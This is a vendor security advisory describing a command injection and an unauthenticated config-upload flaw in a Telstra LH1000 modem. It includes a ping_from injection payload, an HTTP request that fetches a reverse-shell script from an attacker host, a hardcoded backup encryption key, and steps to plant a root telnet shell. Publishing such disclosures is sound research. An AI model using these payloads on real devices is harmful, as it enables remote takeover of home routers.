# Multiple Vulnerabilities in Telstra Device

High

[← View More Research Advisories](/security/research)
### Synopsis

A researcher at Tenable has discovered multiple vulnerabilities in a Telstra device which could result in unauthenticated remote code execution.

**CVE-2023-43477: Post-Auth Command Injection in ping\_from parameter of ping\_tracerte.cgi**

CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

The **ping\_from** parameter in the ping/traceroute diagnostic commands sent via **http://[LH1000-address]/ping\_tracerte.cgi** was vulnerable to command injection.

Unlike the other parameters, it was not sanitized before being passed to strings which build the diagnostic commands, and are then called with **popen()** in **/usr/sbin/httpd**.

For example, intercepting and modifying the **POST** request to **ping\_tracerte.cgi** in a proxy like Burpsuite to have a **ping\_from**parameter as the following (while maintaining the rest of the parameters as normal for the command):

```

ping_from=;uname+-a
```

Resulted in the following line being visible in the output:

```

Linux mymodem 4.1.38 #1 SMP PREEMPT Fri Aug 13 16:24:57 CST 2021 armv7l
GNU/Linux
```

**Proof of Concept:**

It was also possible to string together longer chains of commands. Sending a request similar to the following downloaded a reverse shell script from a listener on the attacker host at 192.168.0.2 and saves it to /tmp/shell.sh, which was then run. The **${IFS}** blocks here are being used in place of spaces in the shell command.

```

POST /ping_tracerte.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 252
Accept: */*
X-Requested-With: XMLHttpRequest
Cookie: disableLogout=0;

httoken=518287608&enter=start&util_name=pingtest&ping_ip=192.168.0.1
&ping_from=;curl${IFS}http://192.168.0.2:443/shell.sh${IFS}-o${IFS}/tmp/shell.sh;
&ping_size=56&ping_repeat=4&ping_timeout=10&tracert_host=www.telstra.com.au
&tracert_hops=30

**CVE-2023-43478: Unauthenticated configuration restore and firmware update**

CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

An unauthenticated user could access **http://[LH1000-address]/hninh987R47san82.htm** which contained a form which allowed for the upload of manual firmware updates and configuration backups via **http://[LH1000-address]/fake\_upload.cgi**.

Prior to submitting the form with a configuration backup or firmware update, the page checked for a valid key in a request made to **http://[LH1000-address]/login\_fw.cgi.** The key was hardcoded and so this check could be bypassed.

However even that is unnecessary, as it was also possible for requests to **fake\_upload.cgi**without that key and upload an update or configuration backup directly.

**Proof of Concept:**

**Note:** Without further investigation, it is unknown exactly what settings are and are not required by a configuration backup and which are unique to a particular device. Uploading a configuration backup which has incorrect settings **could disable the device**, even beyond recovery using the hardware factory reset.

The simplest way of exploiting this issue was uploading a configuration backup with settings which granted an attacker greater access:

* Changing **ARC\_SYS\_Password** to alter the admin password for the device
* Setting **ARC\_TELNETD\_ENABLE, ARC\_SYS\_RDFlag and ARC\_SYS\_MPTEST**to 1 to enable a root telnet shell on port 23
* Any other changes which could achieve an attacker's desired effects

**Step 1:** Starting with a valid configuration backup is the easiest way to not permanently damage the device. These could be downloaded from a test device (post-authentication) and altered as required to reflect the device being attacked.

**Step 2:** LH1000 configuration backups, at the time of discovery, were encrypted with a hardcoded key and could be decrypted using the following command:

```

openssl enc -d -aes-256-cbc -md MD5 -salt -in LH1000V1-backup.cfg -out dec.tgz -k '2&15u69A'
```

Then decompressed with:

```

tar -xvf dec.tgz
```

This will result in a ‘config’ directory being created in the current directory, containing all of the device’s backed up configuration files.

**Step 3:**The configuration files could then be modified. As an example, it was possible to enable a root telnet shell to be listening on port 23 by

setting the following in the **.glbcfg** file:

```

ARC_TELNETD_ENABLE=1
ARC_SYS_RDFlag=1
ARC_SYS_MPTEST=1
```

This caused the right conditions to be passed in **/sbin/arc\_deviceready** to

enable telnet.

**Step 4:** With changes made to the configuration files, the folder needed to be compressed and encrypted. To compress the config folder into **new.cfg**:

```

tar -tzf new.cfg ./config
```

To encrypt the config, resulting in our encrypted configuration backup

(**newenc.cfg**):

```

openssl enc -aes-256-cbc -md MD5 -salt -in new.cfg -out newenc.cfg -k '2&15u69A'

```

**Step 5:** The new config could then be posted to **fake\_upload.cgi** with a request similar to the one shown below. Note that a valid **httoken** could be grabbed via executing **ArcBase.\_t()** in a javascript console on the main login page, or just by copying it from other recent traffic.

The token can then be used in a curl command like the following, where **$token** is the token obtained, newenc.cfg is the configuration backup created in previous steps, and **$LH1000** is the ip address of the target device.

```

curl -F httoken=$token -F [[email protected]](/cdn-cgi/l/email-protection) http://$LH1000/fake_upload.cgi
```

The device will then reboot with the new configuration. If the telnet feature was enabled, a root shell will be listening on port 23 on reboot.
